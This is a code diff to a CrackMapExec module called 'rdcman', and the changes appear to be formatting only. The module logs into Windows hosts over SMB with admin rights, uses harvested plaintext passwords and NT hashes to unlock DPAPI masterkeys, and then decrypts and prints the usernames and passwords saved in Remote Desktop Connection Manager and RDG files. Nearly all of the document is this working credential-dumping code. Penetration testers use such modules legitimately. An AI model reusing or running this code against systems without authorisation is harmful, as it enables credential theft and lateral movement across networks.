@@ -9,11 +9,12 @@ from dploot.lib.smb import DPLootSMBConnection
 
 from cme.helpers.logger import highlight
 
+
 class CMEModule:
     name = "rdcman"
     description = "Remotely dump Remote Desktop Connection Manager (sysinternals) credentials"
     supported_protocols = ["smb"]
-    opsec_safe= True
+    opsec_safe = True
     multiple_hosts = True
 
     def options(self, context, module_options):
@@ -25,12 +26,11 @@ class CMEModule:
         self.masterkeys = None
 
         if "PVK" in module_options:
-            self.pvkbytes = open(module_options["PVK"], 'rb').read()
+            self.pvkbytes = open(module_options["PVK"], "rb").read()
 
         if "MKFILE" in module_options:
             self.masterkeys = parse_masterkey_file(module_options["MKFILE"])
-            self.pvkbytes = open(module_options["MKFILE"], 'rb').read() 
-
+            self.pvkbytes = open(module_options["MKFILE"], "rb").read()
 
     def on_admin_login(self, context, connection):
         host = connection.hostname + "." + connection.domain
@@ -86,22 +86,28 @@ class CMEModule:
         conn = None
 
         try:
-            conn = DPLootSMBConnection(target) 
+            conn = DPLootSMBConnection(target)
             conn.smb_session = connection.conn
         except Exception as e:
             context.log.debug("Could not upgrade connection: {}".format(e))
             return
 
-        plaintexts = {username:password for _, _, username, password, _,_ in context.db.get_credentials(cred_type="plaintext")}
-        nthashes = {username:nt.split(':')[1] if ':' in nt else nt for _, _, username, nt, _,_ in context.db.get_credentials(cred_type="hash")}
-        if password != '':
+        plaintexts = {username: password for _, _, username, password, _, _ in context.db.get_credentials(cred_type="plaintext")}
+        nthashes = {username: nt.split(":")[1] if ":" in nt else nt for _, _, username, nt, _, _ in context.db.get_credentials(cred_type="hash")}
+        if password != "":
             plaintexts[username] = password
-        if nthash != '':
+        if nthash != "":
             nthashes[username] = nthash
 
         if self.masterkeys is None:
             try:
-                masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=self.pvkbytes, passwords=plaintexts, nthashes=nthashes)
+                masterkeys_triage = MasterkeysTriage(
+                    target=target,
+                    conn=conn,
+                    pvkbytes=self.pvkbytes,
+                    passwords=plaintexts,
+                    nthashes=nthashes,
+                )
                 self.masterkeys = masterkeys_triage.triage_masterkeys()
             except Exception as e:
                 context.log.debug("Could not get masterkeys: {}".format(e))
@@ -119,21 +125,71 @@ class CMEModule:
                 if rdcman_file is None:
                     continue
                 for rdg_cred in rdcman_file.rdg_creds:
-                    if rdg_cred.type == 'cred':
-                        context.log.highlight("[%s][%s] %s:%s" % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))
-                    elif rdg_cred.type == 'logon':
-                        context.log.highlight("[%s][%s] %s:%s" % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))
-                    elif rdg_cred.type == 'server':
-                        context.log.highlight("[%s][%s] %s - %s:%s" % (rdcman_file.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))
+                    if rdg_cred.type == "cred":
+                        context.log.highlight(
+                            "[%s][%s] %s:%s"
+                            % (
+                                rdcman_file.winuser,
+                                rdg_cred.profile_name,
+                                rdg_cred.username,
+                                rdg_cred.password.decode("latin-1"),
+                            )
+                        )
+                    elif rdg_cred.type == "logon":
+                        context.log.highlight(
+                            "[%s][%s] %s:%s"
+                            % (
+                                rdcman_file.winuser,
+                                rdg_cred.profile_name,
+                                rdg_cred.username,
+                                rdg_cred.password.decode("latin-1"),
+                            )
+                        )
+                    elif rdg_cred.type == "server":
+                        context.log.highlight(
+                            "[%s][%s] %s - %s:%s"
+                            % (
+                                rdcman_file.winuser,
+                                rdg_cred.profile_name,
+                                rdg_cred.server_name,
+                                rdg_cred.username,
+                                rdg_cred.password.decode("latin-1"),
+                            )
+                        )
             for rdgfile in rdgfiles:
                 if rdgfile is None:
                     continue
                 for rdg_cred in rdgfile.rdg_creds:
-                    if rdg_cred.type == 'cred':
-                        context.log.highlight("[%s][%s] %s:%s" % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))
-                    elif rdg_cred.type == 'logon':
-                        context.log.highlight("[%s][%s] %s:%s" % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))
-                    elif rdg_cred.type == 'server':
-                        context.log.highlight("[%s][%s] %s - %s:%s" % (rdgfile.winuser, rdg_cred.profile_name, rdg_cred.server_name, rdg_cred.username, rdg_cred.password.decode('latin-1')))
+                    if rdg_cred.type == "cred":
+                        context.log.highlight(
+                            "[%s][%s] %s:%s"
+                            % (
+                                rdgfile.winuser,
+                                rdg_cred.profile_name,
+                                rdg_cred.username,
+                                rdg_cred.password.decode("latin-1"),
+                            )
+                        )
+                    elif rdg_cred.type == "logon":
+                        context.log.highlight(
+                            "[%s][%s] %s:%s"
+                            % (
+                                rdgfile.winuser,
+                                rdg_cred.profile_name,
+                                rdg_cred.username,
+                                rdg_cred.password.decode("latin-1"),
+                            )
+                        )
+                    elif rdg_cred.type == "server":
+                        context.log.highlight(
+                            "[%s][%s] %s - %s:%s"
+                            % (
+                                rdgfile.winuser,
+                                rdg_cred.profile_name,
+                                rdg_cred.server_name,
+                                rdg_cred.username,
+                                rdg_cred.password.decode("latin-1"),
+                            )
+                        )
         except Exception as e:
             context.log.debug("Could not loot RDCMan secrets: {}".format(e))
